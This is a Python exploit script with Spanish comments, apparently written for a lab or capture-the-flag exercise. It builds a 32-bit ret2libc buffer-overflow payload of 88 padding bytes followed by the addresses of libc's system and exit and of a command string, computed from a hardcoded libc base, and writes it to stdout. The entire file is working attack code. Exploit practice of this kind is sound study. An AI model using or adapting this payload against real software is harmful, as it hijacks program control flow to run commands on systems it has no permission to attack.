#!/usr/bin/env python3
import struct
import sys
from pwn import ELF


libc = ELF("/lib32/libc.so.6", checksec=False )  # usa la misma que el servidor
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
command_offset = 0x18dc9b + 0x9 # next(libc.search(b"ls")) 

base = 0xf7cf7000

system_addr = struct.pack("<I",(base + system_offset))       # 0xf7e12360)
exit_addr = struct.pack("<I",(base + exit_offset))      # 0xf7e04ec0)
command_addr  = struct.pack("<I", (base + command_offset))   # 0xf7e12360)


offset = 88 # Ajustar segun lo hallado
# system_addr = 0xf7d81670
# exit_addr = 0xf7d6c130
# ls_addr = 0xf7efd956


payload = b"A" * offset
payload += system_addr
payload += exit_addr # Relleno
payload += command_addr

sys.stdout.buffer.write(payload)